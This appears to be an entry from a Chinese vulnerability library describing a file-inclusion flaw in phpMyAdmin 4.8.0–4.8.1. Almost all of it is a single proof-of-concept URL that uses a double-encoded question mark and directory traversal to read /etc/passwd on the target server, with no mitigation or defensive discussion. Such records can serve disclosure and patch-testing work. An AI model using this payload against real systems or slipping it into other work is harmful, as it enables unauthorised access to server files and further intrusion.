---
title: 'phpMyAdmin文件包含漏洞'
date: Tue, 22 Sep 2020 16:59:02 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

phpMyAdmin 4.8.0-4.8.1

### 漏洞POC

```
http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd 
```